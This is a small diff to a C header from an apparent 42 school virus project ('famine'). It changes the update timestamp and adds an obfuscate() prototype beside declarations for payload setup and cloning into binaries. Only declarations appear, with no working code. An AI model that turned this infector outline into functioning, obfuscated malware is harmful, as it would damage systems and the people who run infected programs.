@@ -6,7 +6,7 @@
 /*   By: jfortin <jfortin@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/06/04 04:27:47 by agrumbac          #+#    #+#             */
-/*   Updated: 2019/06/15 17:17:38 by ichkamo          ###   ########.fr       */
+/*   Updated: 2019/12/07 19:12:56 by nhaquet          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
@@ -72,7 +72,7 @@ bool		setup_payload(const struct entry *original_entry, const struct safe_pointe
 bool		adjust_references(const struct safe_pointer info, size_t shift_amount, const struct entry *original_entry);
 bool		copy_to_clone(const struct famine food, size_t end_last_sect, \
 			size_t shift_amount, size_t original_size);
-
+bool 		obfuscate(struct entry *clone_entry, const struct famine *food);
 /*
 ** payload
 */
